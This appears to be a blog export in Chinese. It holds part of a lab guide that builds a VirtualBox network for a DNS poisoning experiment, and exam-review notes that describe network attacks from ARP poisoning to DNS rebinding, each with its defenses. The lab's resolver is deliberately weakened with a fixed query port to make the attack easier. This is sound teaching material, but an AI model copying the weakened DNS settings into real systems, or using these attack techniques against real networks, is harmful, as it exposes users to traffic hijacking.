网卡1”栏目中，将连接方式改为“内部网络”，然后名称改为intnet0/1/2（这里根据自己需求来写，比如我配的权威DNS就是intnet1）</p>
<p>最后进入虚拟机中，在上方栏目的“设备”中点击安装增强功能，它会自动打开一个文件夹，在终端里运行autorun.sh即可自动安装，之后重启虚拟机就可以启用双向粘贴板和拖放了</p>
<h1 id="虚拟机网络配置">[2] 虚拟机网络配置</h1>
<p>IP 分配为：</p>
<p>攻击者——192.168.3.200</p>
<p>受害者——192.168.3.100</p>
<p>权威服务器——192.168.4.105</p>
<p>正常网站——192.168.4.100</p>
<p>递归服务器——192.168.5.53</p>
<p>钓鱼网站——192.168.5.80</p>
<h2 id="openwrt">[2-1] openwrt</h2>
<h3 id="network">[2-1-1] network</h3>
<p>通过 <code>vi /etc/config/network</code>
为每个⽹络接⼝配置相应的设置。这通常包括设置IP地址、⽹关、⼦⽹掩码等，这里我配置为以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config interface &#x27;loopback&#x27; </span><br><span class="line">  option device &#x27;lo&#x27;</span><br><span class="line">  option proto &#x27;static&#x27;</span><br><span class="line">  option ipaddr &#x27;127.0.0.1&#x27;</span><br><span class="line">  option netmask &#x27;255.0.0.0&#x27;</span><br><span class="line"></span><br><span class="line">config interface &#x27;wan&#x27;</span><br><span class="line">  option device &#x27;eth0&#x27;</span><br><span class="line">  option proto &#x27;dhcp&#x27;</span><br><span class="line"></span><br><span class="line">config interface &#x27;lan1&#x27; </span><br><span class="line">  option ifname &#x27;eth1&#x27; </span><br><span class="line">  option proto &#x27;static&#x27; </span><br><span class="line">  option ipaddr &#x27;192.168.3.1&#x27; </span><br><span class="line">  option netmask &#x27;255.255.255.0&#x27; </span><br><span class="line"> </span><br><span class="line">config interface &#x27;lan2&#x27; </span><br><span class="line">  option ifname &#x27;eth2&#x27; </span><br><span class="line">  option proto &#x27;static&#x27; </span><br><span class="line">  option ipaddr &#x27;192.168.4.1&#x27; </span><br><span class="line">  option netmask &#x27;255.255.255.0&#x27; </span><br><span class="line"></span><br><span class="line">config interface &#x27;lan3&#x27; </span><br><span class="line">  option ifname &#x27;eth3&#x27; </span><br><span class="line">  option proto &#x27;static&#x27; </span><br><span class="line">  option ipaddr &#x27;192.168.5.1&#x27; </span><br><span class="line">  option netmask &#x27;255.255.255.0&#x27; </span><br></pre></td></tr></table></figure>
<p>其中，wan与virtualbox‘网络’配置中的网卡1(网络地址转换)是对应的，device是eth0。lan1与virtualbox‘网络’配置中的网卡2(intnet0)是对应的，device是eth1，ipaddr192.168.3.1是网关ip，netmask是子网掩码，以此类推lan2和lan3。</p>
<p>配置好之后，我们需要使用 <code>/etc/init.d/network restart</code>
重启服务</p>
<h3 id="firewall">[2-1-2] firewall</h3>
<p>通过 <code>vi /etc/config/firewall</code> 添加或修改防⽕墙规则，这里
firewall 的文件太长，我就不贴在这里了，可以自行gpt。编辑好之后，可以通过
<code>/etc/init.d/firewall restart</code> 重启防火墙</p>
<h3 id="测试网络">[2-1-3] 测试网络</h3>
<p>可以通过 <code>ping www.baidu.com</code> 和 <code>ping 8.8.8.8</code>
来测试路由器是否可以访问互联网。</p>
<h2 id="ubuntu">[2-2] ubuntu</h2>
<p>可以通过
<code>sudo vim /etc/netplan/01-network-manager-all.yaml</code> 来配置
ubuntu 虚拟机的网络设置，以权威域名服务器为例，配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Let NetworkManager manage all devices on this system</span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd</span><br><span class="line">  ethernets:</span><br><span class="line">    enp0s3:</span><br><span class="line">      dhcp4: no</span><br><span class="line">      addresses:</span><br><span class="line">        - 192.168.4.105/24</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.4.1</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses:</span><br><span class="line">          - 8.8.8.8</span><br><span class="line">          - 8.8.4.4</span><br></pre></td></tr></table></figure>
<p>然后通过 <code>sudo netplan apply</code>
重启网络配置，其他几个虚拟机也如法炮制</p>
<p>重启之后，可以通过 <code>ping www.baidu.com</code>
来判断是否可以通过路由器访问外网，如果成功则网络配置完毕；如果失败则使用
<code>ping 192.168.4.1</code>
来判断路由器与虚拟机之间的网络是否连接正常，如果成功则说明路由器无法访问互联网，如果失败则说明虚拟机和路由器间链接不正常，检查virtualbox网卡配置、虚拟机网络配置和路由器网关、防火墙配置。</p>
<h1 id="域名服务器">[3] 域名服务器</h1>
<p>在本实验中，我们使用 bind9 来配置 DNS，首先通过以下命令下载 bind9</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install bind9 bind9utils bind9-doc</span><br></pre></td></tr></table></figure>
<h2 id="权威域名服务器">[3-1] 权威域名服务器</h2>
<p>权威域名服务器存储了完整的域名，直接通过访问数据库获取最新的域名和ip对应关系</p>
<h3 id="配置-zone-文件">[3-1-1] 配置 zone 文件</h3>
<p>首先，我们需要编辑 bind9 的配置文件。bind9 的主配置文件通常是
<code>/etc/bind/named.conf.local</code>，我们在这个文件中添加下述内容，等价于为
bind9 添加了一个 zone</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone &quot;test.seclab.online&quot; &#123;</span><br><span class="line">    type master;</span><br><span class="line">    file &quot;/etc/bind/zones/db.test.seclab.online&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其次，我们需要创建区域数据文件。我们先使用
<code>sudo mkdir /etc/bind/zones</code> 创建目录，再使用
<code>sudo vim /etc/bind/zones/db.test.seclab.online</code>
向该数据文件中加入下面内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$TTL    10 ; 以下NS、A等记录如果不指定生存期，默认10s的ttl</span><br><span class="line">@       IN      SOA     ns1.test.seclab.online. admin.test.seclab.online. (</span><br><span class="line">                     2024120601 ; 每次更新 DNS 区域文件时都需要更新序列号，通常是 YYYYMMDDNN</span><br><span class="line">                     604800     ; Refresh</span><br><span class="line">                     86400      ; Retry</span><br><span class="line">                     2419200    ; Expire</span><br><span class="line">                     10 )   ; 如果没有找到该域名，NXDOMAIN在递归DNS服务器中的ttl是10秒</span><br><span class="line"></span><br><span class="line">; Name servers</span><br><span class="line">        IN      NS      ns1.test.seclab.online.</span><br><span class="line"></span><br><span class="line">; NS 记录指向 权威域名服务器</span><br><span class="line">; A  记录定义了主机名到 IP 地址的映射</span><br><span class="line">; 权威域名服务器是 .4.105</span><br><span class="line">ns1     IN      A       192.168.4.105</span><br><span class="line"></span><br><span class="line">; test.seclab.online 的对应 ip 是 .4.100</span><br><span class="line">@       IN      A       192.168.4.100</span><br><span class="line"></span><br><span class="line">; www.test.seclab.online 的对应 ip 是 .4.100</span><br><span class="line">www     IN      A       192.168.4.100</span><br></pre></td></tr></table></figure>
<h3 id="配置-bind-监听-ip-地址">[3-1-2] 配置 BIND 监听 IP 地址</h3>
<p>编辑 BIND 的主配置文件
<code>/etc/bind/named.conf.options</code>，设置 BIND 监听的 IP
地址和端口。确保该文件中存在:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options &#123;</span><br><span class="line">    directory &quot;/var/cache/bind&quot;;</span><br><span class="line"></span><br><span class="line">    recursion no;  # 禁止递归查询，只作为权威 DNS 服务器</span><br><span class="line">    allow-query &#123; any; &#125;;  # 允许任何人查询</span><br><span class="line">    listen-on &#123; 192.168.4.105; &#125;;  # 监听特定的 IP 地址</span><br><span class="line">    listen-on-v6 &#123; none; &#125;;  # 禁止 IPv6</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="启动服务">[3-1-3] 启动服务</h3>
<p>使用以下命令重启 BIND9 服务并使防火墙允许 DNS 请求通过 53 端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart bind9</span><br><span class="line"></span><br><span class="line">sudo ufw allow 53</span><br><span class="line">sudo ufw reload</span><br></pre></td></tr></table></figure>
<h3 id="测试">[3-1-4] 测试</h3>
<p>在客户端上通过 <code>dig @192.168.4.105 test.seclab.online</code>
命令，如果 DNS 配置正确，我们可以看到如下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.28-0ubuntu0.22.04.1-Ubuntu &lt;&lt;&gt;&gt; @192.168.4.105 test.seclab.online</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41596</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 1232</span><br><span class="line">; COOKIE: 5e30601cfcf185d8010000006752e9109d77d9b6c83e4824 (good)</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;test.seclab.online.		IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">test.seclab.online.	604800	IN	A	192.168.4.100</span><br><span class="line"></span><br><span class="line">;; Query time: 3 msec</span><br><span class="line">;; SERVER: 192.168.4.105#53(192.168.4.105) (UDP)</span><br><span class="line">;; WHEN: Fri Dec 06 20:07:44 CST 2024</span><br><span class="line">;; MSG SIZE  rcvd: 91</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="递归域名服务器">[3-2] 递归域名服务器</h2>
<h3 id="options文件">[3-2-1] options文件</h3>
<p>首先通过 <code>sudo vim /etc/bind/named.conf.options</code> 编辑
bind9 的主配置文件，在其中放入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options &#123;</span><br><span class="line">    directory &quot;/var/cache/bind&quot;;</span><br><span class="line"></span><br><span class="line">    // 启用递归查询</span><br><span class="line">    recursion yes;</span><br><span class="line"></span><br><span class="line">    // 设置允许进行递归查询的客户端 IP 范围</span><br><span class="line">    allow-recursion &#123; any; &#125;;</span><br><span class="line"></span><br><span class="line">    // 监听所有网络接口上的 DNS 请求</span><br><span class="line">    listen-on &#123; any; &#125;;</span><br><span class="line">    listen-on-v6 &#123; any; &#125;;</span><br><span class="line"></span><br><span class="line">    // 允许使用非官方 DNS 服务器数据 -&gt; 我们的权威 DNS 服务器是非官方的</span><br><span class="line">    dnssec-validation no;</span><br><span class="line"></span><br><span class="line">    // Forwarders 指定上游 DNS 服务器，我们没配置根域名服务器等，因此需要指定上游 DNS 服务器。</span><br><span class="line">    forwarders &#123;</span><br><span class="line">        192.168.4.105</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 默认行为是允许所有查询</span><br><span class="line">    allow-query &#123; any; &#125;;</span><br><span class="line"></span><br><span class="line">    // 禁止递归查询从非本地网络发起（提高安全性）</span><br><span class="line">    allow-query-cache &#123; any; &#125;;</span><br><span class="line"></span><br><span class="line">    // 默认端口 10001，减少后续攻击难度</span><br><span class="line">    query-source port 10001;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>完成配置后，我们使用 <code>sudo systemctl restart bind9</code>
重启配置，并通过以下命令设置防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 53</span><br><span class="line">sudo ufw reload</span><br></pre></td></tr></table></figure>
<h3 id="客户端设置">[3-2-2] 客户端设置</h3>
<p>由于客户端虚拟机默认的 nameserver 不是 192.168.5.53，因此我们需要使用
<code>sudo vim /etc/resolv.conf</code> 将
<code>nameserver 127.0.0.53</code> 改为我们自己的递归域名服务器，即
192.168.5.53</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>DNS poisoning</tag>
      </tags>
  </entry>
  <entry>
    <title>Web - 网络安全概述</title>
    <url>/posts/27202.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
12.24网络安全期末，用这篇文章来梳理一下对相关知识的理解
</blockquote>
<span id="more"></span>
<figure>
<img src="/pic/5cddd5eea2e4549ee0b1252922577350.png" alt="导图" />
<figcaption aria-hidden="true">导图</figcaption>
</figure>
<p>这篇文章主要从TCP/IP五层模型的层次来比较宽泛地讲一些常见的网络攻击。众所周知，TCP/IP五层模型将网络架构分为物理层、数据链路层、网络层、运输层和应用层。针对物理层的攻击我不是很懂，因此不在本篇文章的描述范围内，而应用层出现的app漏洞和防御技术比较广泛，会用几章分别叙述。</p>
<blockquote>
<p>每一章大概分为"协议-攻击方式-防御措施"三部分。常见攻击可以分为"DoS,投毒,劫持"，其中，劫持一般是劫持有状态的协议。</p>
</blockquote>
<h1 id="数据链路层局域网">[1] 数据链路层(局域网)</h1>
<h2 id="协议">[1-1] 协议</h2>
<p>这部分讲述的协议不只是设计数据链路层的协议，而是涉及到局域网通信的协议。</p>
<p>由于物理媒介的不同，我们可以把网络分为有线网络和无线网络。无线网络涉及AP、信道等内容，不利于基础攻防技术的学习，因此本文主要基于有线网络进行讲述。根据IEEE
802.3 的规定，有线网络使用的数据传输策略是CSMA/CD(carrier sensation
multiple access/collision
detection)，即带有碰撞检测的载波监听多点接入技术，该技术的细节就不在这里过多描述，
我们只需要知道因为该协议的存在，数据链路层的数据包的data部分必须控制在46byte-1500byte，被称为MTU。在数据链路层中，我们为每一个网络设备分配了唯一的标识符，即MAC地址(media
access control
address)。多个网络设备可以通过交换机连接成一个局域网。</p>
<h3 id="arp">[1-1-1] ARP</h3>
<p>如果设备A要与设备B通信，那么A需要先通过ARP协议得知B的MAC地址。ARP其实是通过IP地址找MAC地址的一种协议，如果发送方A不知道接受方B的MAC地址，A会先广播一条消息"我是A(MAC:aaa,IP:aaa)，我想知道bbb这个IP对应的MAC地址是什么"，这条消息叫做ARP
Request。用同一台交换机相连的所有网络设备都会接收到这条消息，当B发现A在找自己的时候，B就会记录下A的MAC地址，然后给A回复一条消息告诉A"bbb这个IP地址指的是我，我的MAC地址是bbb"</p>
<p>在数据传输的过程中，交换机也会不断学习这个数据包的源MAC地址和目的MAC地址，记录在交换机的缓存当中，这个过程叫做交换机的逆学习过程。</p>
<h3 id="dhcp">[1-1-2] DHCP</h3>
<p>如果设备A想要跟互联网通信，那么设备A必须要获取自己的IP地址和所在子网，除此之外，它还需要知道递归DNS服务器和默认网关的IP地址，这些都是DHCP服务器为设备A分配的。</p>
<h2 id="常见攻击">[1-2] 常见攻击</h2>
<h3 id="arp-1">[1-2-1] ARP</h3>
<h4 id="arp-dosmac地址洪泛">[1-2-1-1] ARP DoS(MAC地址洪泛)</h4>
<p>交换机的MAC表有老化机制，当一条MAC记录生存期结束之后才会被新的MAC记录替换；而MAC表的容量又是有限的，如果MAC表满了，并且当前表中所有记录都尚未过期，那此时交换机将对它无法找到MAC地址的所有数据包进行泛洪，也就是将这个数据包广播到它的所有接口(除了收到数据包的接口)。</p>
<p>如果攻击者伪造大量的MAC地址将交换机填满，再发送大量不在表中的MAC地址给交换机，交换机就会广播大量数据包给局域网，给网络造成压力。</p>
<h4 id="arp-缓存投毒">[1-2-1-2] ARP 缓存投毒</h4>
<ul>
<li>ARP Reply</li>
</ul>
<p>攻击者伪造reply包，欺骗受害者的目的MAC地址</p>
<ul>
<li>ARP Request</li>
</ul>
<p>攻击者伪造request包，欺骗受害者的源MAC地址</p>
<p>这两种攻击可以欺骗客户端/网关/服务器，获取他们发送/接收的数据包。</p>
<h3 id="dhcp-1">[1-2-2] DHCP</h3>
<h4 id="dhcp-dos">[1-2-2-1] DHCP DoS</h4>
<p>攻击者伪造大量"从不同MAC发来的DHCP
req"数据包，消耗DHCP服务器分配的资源 #### [1-2-2-2] DHCP 投毒
攻击者伪装成DHCP服务器向受害者发送DHCP Reply</p>
<h1 id="网络层">[2] 网络层</h1>
<h2 id="协议-1">[2-1] 协议</h2>
<h3 id="ip">[2-1-1] IP</h3>
<p>由于MAC地址唯一且不可随意更改，我们需要用IP地址来灵活管理接入网络的设备。IP协议规定了数据包
的头部(比如源IP目的IP，是否分片)，同时IP协议规定了最大数据包大小(MTU,1500bytes)，其中IP头占据20字节</p>
<h3 id="icmp">[2-1-2] ICMP</h3>
<p>ICMP协议用于报告网络通信中的错误情况和诊断信息，ICMP头部包含type(类型)、code(子类型)、checksum和其余字段，通过改变type/code等内容，可以报告不同的错误类型，
比如目标不可达、超时和源抑制等，ICMP头一般占据8byte</p>
<h2 id="常见攻击-1">[2-2] 常见攻击</h2>
<h3 id="ip-1">[2-2-1] IP</h3>
<h4 id="ping-of-death">[2-2-1-1] Ping of Death</h4>
<p>ICMP协议规定 ICMP Echo Request 的数据包最大不超过 65535
字节，去掉IP和ICMP头部的28字节， 还剩 65507
byte。如果我们构造的数据包数据部分大于这个数目，可能会导致缓冲区溢出。
比如我们构造一个75000byte的数据包，MTU大小为1500，去掉头部还剩1472byte，所以我们需要
构造 <span class="math inline">\(\lceil 75000 / 1472 \rceil =
51\)</span> 个分片，当这些分片被组合起来的时候就会造成缓冲区溢出。</p>
<h3 id="icmp-1">[2-2-2] ICMP</h3>
<h4 id="smurf攻击icmp-dos">[2-2-2-1] Smurf攻击(ICMP DoS)</h4>
<p>攻击者向某个含有大量网络设备的广播域发送一个 ICMP Echo Request
包，这个包的
源IP地址伪造为受害者的IP，这样该广播域所有接收到request包的设备都会向受害者
发送reply包，导致流量放大，使受害者网络资源耗尽。</p>
<h4 id="icmp-redirecticmp-poisoning">[2-2-2-2] ICMP Redirect(ICMP
Poisoning)</h4>
<p>ICMP包中Type=5叫做重定向包，路由器A在接收到用户的数据包后，
发现用户将该数据包转发到B可以更有效地到达目标，就会用 ICMP
重定向包告知用户更改默认网关。
如果在用户发出一个数据包后，攻击者伪造一个IMCP重定向包，将用户的默认网关修改为自己可以控制的IP，
用户发出的所有流量就会被攻击者获得。</p>
<h2 id="防护措施-ipsec">[2-3] 防护措施-IPSec</h2>
<p>通过常见攻击手段，我们可以发现利用网络层发起的攻击都有以下特点：①报头会被伪造②数据包
可以被修改后转发或重放。因此，我们设计的防御措施可以从以下安全目标出发：
①加密数据包，防止中间人查看数据②加入序列号，防止重放攻击③加入哈希函数和数字签名，
防止数据包伪造。</p>
<h3 id="组件">[2-3-1] 组件</h3>
<p>ESP: 封装安全载荷，提供数据完整性、不可抵赖性和保密性</p>
<p>AH: 认证报头协议，提供数据完整性、不可抵赖性</p>
<p>IKE: 互联网密钥交换协议</p>
<h4 id="密钥管理系统">[2-3-1-1] 密钥管理系统</h4>
<p>Security Association(SA):
一组用于保护通信的安全参数，定义了数据包如何传入传出
SA是单向的，因此双向通信需要用到2个SA。
SA一般由IKE自动维护，SA中包括一个参数叫做Security Parameter
Index，用于在数据库中索引和匹配SA</p>
<p>Security Association Database(SAD):
端点用于存储SA的数据库，发送方发送数据包前首先检查SAD确认发送方式，
接收方接收到数据包后，根据数据包中的SPI匹配SAD中的SA，来确认用什么方式处理数据包。</p>
<p>Security Policy Database(SPD):
端点通过源IP、目的IP和协议号来匹配SPD，查看此次通话是否需要用到IPSec，
如果要用的话就去查找SAD，确认使用哪个SA。</p>
<p>IKE工作流程：IKE的工作分为两阶段，第一阶段协商一个辅助的端到端安全信道IKE
SA，第二阶段用于协商范围更小的IPSec SA。
IKE经常分为用户IKE守护进程，或者是内核IKE。当IKE进程启动时就会协商IKE
SA，后续每个应用程序使用IKE的话，
IKE就会进入第二阶段，为每个进程协商IPSec SA</p>
<h3 id="传输模式">[2-3-2] 传输模式</h3>
<p>传输模式：不加密IP头，适用于端到端</p>
<p>隧道模式：加密IP头，适用于网关到网关</p>
<h3 id="esp-tun-mode-工作流程">[2-3-3] ESP TUN Mode 工作流程</h3>
<p>①在原始数据包前后加入ESP头和ESP尾形成新数据包，ESP头包含SPI和序列号，ESP尾用于padding</p>
<p>②加密新数据包，形成enchidala，注意头部是不加密的，要不然接收方无法确认SPI，也就无法选择SA。</p>
<p>③对enchidala进行mac计算，将结果拼接到enchidala尾部</p>
<p>④最终数据包: 新IP头 + enchidala + MAC认证</p>
<h1 id="运输层">[3] 运输层</h1>
<h2 id="协议-2">[3-1] 协议</h2>
<h3 id="udp">[3-1-1] UDP</h3>
<p>UDP类似于IP协议，在底层数据包的基础上加入一个8字节的头部，包含源端口、目的端口、长度和checksum。
UDP协议是无状态的。</p>
<h3 id="tcp">[3-1-2] TCP</h3>
<p>TCP协议是有状态的，通过三次握手建立连接，通过四次挥手释放连接。</p>
<p>三次握手过程为： ①A随机挑选一个序列号seq=x，向B发送seq=x的数据包
②B随机挑选一个序列号ack=y，向A发送seq=y,ack=x+1的数据包，同时将SYN和ACK标志位设置为1
同时服务器分配一个端口给该TCP连接，此时B称为半连接状态
③A接收到数据包之后，向B发送seq=x+1，ack=y+1的数据包，该数据包ACK标志为1，第三次握手已经可以携带其他数据。</p>
<p>四次挥手考察的比较少，用人话来说可以模拟成如下场景：</p>
<p>A:我数据发完了，连接可以关闭了</p>
<p>B:我知道了，连接先留着，等我数据发完再关</p>
<p>B:我发完了，TCP连接可以关了</p>
<p>A:我知道了，那就关吧</p>
<h2 id="主要攻击方式">[3-2] 主要攻击方式</h2>
<h3 id="端口扫描与资产探查">[3-2-1] 端口扫描与资产探查</h3>
<p>资产探查就是利用不同操作系统、app等对IP、ICMP等协议数据包处理细节的不同，来判断该主机使用的是什么OS或app。
比如windows和linux对TTL设置就不相同。</p>
<p>按连接状态分，端口扫描有两种方式，全连接扫描和半连接扫描，全连接比较完善，但是半连接更隐蔽一些。</p>
<p>按协议分，端口扫描也可以分为TCP和UDP扫描两种方式。UDP扫描比较简单，就是给一台主机的全部端口发送空的UDP包，
如果收到ICMP目的不可达说明端口关闭，收到响应报文则说明端口开放。</p>
<p>TCP扫描有四种基本方式：Manimon(SYN+ACK),NULL(标志位全0),FIN(FIN),Xmas(FIN,URG,PSH)，
开放的端口对这些错误包都是不予理睬的，FIN扫描最多会回显一个ICMP错误，但是未开放的端口会响应一个RST包</p>
<h4 id="隐蔽扫描">[3-2-1-1] 隐蔽扫描</h4>
<p>攻击者通过伪造数据包srcIP为A的IP，利用主机A来扫描主机B的端口，然后通过ICMP包来查看A的IPID增加数目来判断B的端口是否开放。</p>
<h3 id="tcp-syn-floodtcp-dos">[3-2-2] TCP SYN Flood(TCP DoS)</h3>
<p>攻击者不断发起第一次握手，等服务器第二次握手结束后不发送第三次握手，这样就会大量占据服务器的端口资源</p>
<h3 id="tcp-会话劫持重置">[3-2-3] TCP 会话劫持/重置</h3>
<p>攻击者通过预测TCP序列号，向该TCP连接注入恶意数据包。比如向telnet服务器注入反弹shell命令，或者单纯发一个RST数据包重置TCP连接，都会造成较大的影响。</p>
<blockquote>
<p>如何预测 TCP 序列号？</p>
</blockquote>
<p>RFC标准中规定，如果一台主机收到TCP报文但报文中含有错误的序列号或确认号时，会回复一个ACK报文来明确正确的序列号和确认号。
那么攻击者只要在预测序列号前后都查看一次IPID，如果IPID+1则正确，+2则不正确</p>
<h3 id="tcp反射放大攻击">[3-2-4] TCP反射放大攻击</h3>
<p>防火墙在阻拦TCP连接时往往第一次握手就会回复一个比请求包大的多的阻断包。攻击者可以利用该特性实施反射放大攻击</p>
<blockquote>
<p>补充：CDN反射放大攻击</p>
</blockquote>
<p>当客户向CDN请求资源时，CDN可能会向源站请求完整资源，然后只回复客户所需的资源。攻击者可以构造较小的资源请求，使CDN向源站请求较大的完整资源，从而造成反射放大。</p>
<h2 id="防御措施">[3-3] 防御措施</h2>
<h3 id="针对syn-flood">[3-3-1] 针对SYN Flood</h3>
<ol type="1">
<li>增大半连接等待队列</li>
<li>降低资源回收时间</li>
<li>TCP Cookie，在验证第三次握手cookie正确前不分配资源</li>
</ol>
<h1 id="应用层">[4] 应用层</h1>
<h2 id="域名系统">[4-1] 域名系统</h2>
<h3 id="域名系统概述">[4-1-1] 域名系统概述</h3>
<p>整个域名系统可以由如下部分构成：根域名服务器-顶级域名服务器-权威域名服务器-递归域名服务器-客户端。
客户端如果想要查询一个域名对应的IP地址，只需要向递归域名服务器发起询问，递归域名服务器会向根域名服务器查询顶级域名服务器的位置，
然后向顶级域名服务器查询二级、三级域名服务器的位置，最后向权威域名服务器查询这个域名对应的IP地址。
当递归域名服务器得到IP地址之后，就会向客户返回这个资源条目。</p>
<p>一个资源条目一般包括：域名-缓存时间-资源类别-资源类型-IP地址。资源类型一般包含A(ipv4地址)、AAAA(ipv6地址)、NS(权威DNS名称)、
MX(邮件服务器名称)、CNAME(域名别名)和SOA(起始授权信息)</p>
<p>同时，为了减轻网络压力，递归域名服务器和客户主机一般会缓存一部分DNS条目。</p>
<p>另外，DNS报文体对应报文头中的四个数量字段，它们分别是:</p>
<ol type="1">
<li>问题区域：指定用户查询的目标域名和资源记录类型</li>
<li>应答区域：直接回答查询请求，即满足目标域名和资源记录类型的权威应答</li>
<li>授权区域：一般包含类型为NS的资源记录，指向域名的权威服务器名称</li>
<li>附加区域：包含域名服务器返回的在查询过程中可能用到的其他资源记录，比如权威服务器对应的IP地址等</li>
</ol>
<h3 id="主要攻击方式-1">[4-1-2] 主要攻击方式</h3>
<h4 id="poisoning">[4-1-2-1] Poisoning</h4>
<ol type="1">
<li>应答型</li>
</ol>
<p>客户在发起DNS请求后，攻击者抢在递归域名服务器之前向客户发起响应，不过只有IP地址匹配、端口匹配、TXID匹配和问题区域匹配，
response包才会被递归DNS接收，问题区域可以通过自问自答的方式解决，IP地址填自己就行，
但TXID和目的端口需要攻击者爆破去猜测。</p>
<ol start="2" type="1">
<li>劫持型</li>
</ol>
<h4 id="绕过同源策略dns-重绑定攻击">[4-1-2-2] 绕过同源策略(DNS
重绑定攻击)</h4>
<p>同源策略是指JS脚本只能访问同源资源，同源指的是"协议://域名:端口"相同。绕过同源策略需要攻击者控制递归域名服务器。</p>
<p>当客户向域名服务器查询域名A的IP时，攻击者可以返回一个恶意IP，客户会在这个IP被注入恶意脚本，该恶意脚本每隔一段时间访问域名A。
同时，攻击者控制的DNS服务器将这个域名-IP的缓存时间设置的极短，当该DNS缓存条目过期之后，恶意脚本再访问域名A就会再次向攻击者DNS服务器查询域名，
此时攻击者返回用户的内网IP，恶意脚本就绕过同源策略，可以访问到这个内网IP的资源了。</p>
<h4 id="dns-反射放大">[4-1-2-3] DNS 反射放大</h4>
<p>攻击者伪造DNS请求的srcIP，并向网络中大量递归域名服务器发送请求，这些DNS服务器收到请求后都会返回一个响应包到srcIP，大量占用srcIP网络的资源</p>
<h4 id="dns-劫持">[4-1-2-4] DNS 劫持</h4>
<p>只要攻击者控制了域名系统中包含信道的任何一个关键节点，攻击者就可以将用户访问的域名绑定到恶意IP</p>
<h3 id="防护措施">[4-1-3] 防护措施</h3>
<h4 id="基于随机化">[4-1-3-1] 基于随机化</h4>
<p>事务ID随机化、域名大小写随机化、DNS Cookie(64位随机值)</p>
<h4 id="基于加密">[4-1-3-2] 基于加密</h4>
<p>DNS on TLS</p>
<p>DNS on
HTTPS：与HTTPS协议共享443端口来执行域名解析，防止被防火墙监控和拦截。</p>
<p>DNS on QUIC：基于UDP的协议，传输速度快但尚未普及</p>
<p>DNSSEC：在加密的同时使用签名机制</p>
<h2 id="web系统安全">[4-2] Web系统安全</h2>
<h3 id="web系统概述">[4-2-1] web系统概述</h3>
<p>web系统主要由客户端浏览器、服务器和中间交互的协议组成。</p>
<h3 id="主要攻击">[4-2-2] 主要攻击</h3>
<h4 id="客户端浏览器">[4-2-2-1] 客户端浏览器</h4>
<p>从客户端浏览器出发，我们首先考虑到的风险是前端三件套的风险：html是框架可以暂且不谈；
攻击者可以用css本身诱骗用户进行一些点击操作从而访问恶意网站，比如构建一个透明的样式图，
同时css解析出错也会导致一些问题，比如导致渲染错误，或者利用反斜杠等解析错误来注入某些恶意代码；
再就是javascript，攻击者可以注入恶意js代码，造成信息泄露、会话劫持、DoS等破坏。而除去前端三件套，
第三方插件也会带来隐私泄露和额外引入的安全漏洞，同时第三方插件也可能是恶意软件，泄露用户隐私或者诱骗用户访问恶意网站等。</p>
<h4 id="服务器">[4-2-2-2] 服务器</h4>
<p>从服务器端出发，主要风险可以来源于①持续对话②认证③缓存④分段数据传输</p>
<p>HTTP协议可以基于TCP协议，因此可以通过Connection:
keep-alive来实现持续对话，双方可以在这个持久连接上发送多个HTTP包，减少资源浪费。
但如果服务器发出的一个HTTP包中设置了多个Content-Length字段，web客户端可能会将该对话与多个不同对话对应起来，导致客户端显示混乱，
如果是代理服务器可能还会导致全局缓存错误，分发错误的缓存内容给其他用户。</p>
<p>HTTP协议支持分段数据传输，但过多的数据分段或者content-length设置错误可能会导致整数溢出或者浏览器显示混乱。</p>
<p>HTTP协议有一个认证字段，当认证字段被攻击者修改为明文认证而不是摘要认证时，攻击者就可以获得用户的明文敏感信息。</p>
<p>web缓存器也称为代理服务器，可以是距离用户较近的网关服务器，也可以是较大的CDN。缓存有可能会有非授权的数据访问，也可能保存用户的隐私数据，
当访问缓存参数失当可能也会导致浏览器处理异常，此外，缓存可能被污染。</p>
<h4 id="整个web系统">[4-2-2-3] 整个Web系统</h4>
<ol type="1">
<li>身份假冒攻击：HTTP最开始没有身份认证，攻击者可以伪装成正常的web服务器欺骗用户访问</li>
<li>网络流量监听和中间人：未授权的网络监听被称为被动攻击；主动攻击是指攻击者不仅未授权监听流量，还主动注入恶意流量</li>
</ol>
<h3 id="防护措施-1">[4-2-3] 防护措施</h3>
<h4 id="同源策略">[4-2-3-1] 同源策略</h4>
<h4 id="浏览器插件安全规则">[4-2-3-2] 浏览器插件安全规则</h4>
